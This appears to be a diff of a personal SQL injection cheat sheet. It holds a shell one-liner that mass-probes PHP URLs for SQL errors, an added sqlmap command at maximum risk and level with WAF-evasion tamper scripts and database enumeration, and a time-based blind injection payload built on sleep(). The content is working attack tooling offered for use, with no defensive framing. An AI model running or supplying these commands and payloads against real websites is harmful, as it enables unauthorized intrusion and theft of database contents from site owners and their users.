@@ -1,6 +1,7 @@
 cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Ibrahim\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
 by ibrahim ^^^^
 
+sqlmap -r url --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
 
 (select(0)from(select(sleep(6)))v)/%27%2B(select(0)from(select(sleep(6)))v)%2B%27%22%2B(select(0)from(select(sleep(6)))v)%2B%22/&
 
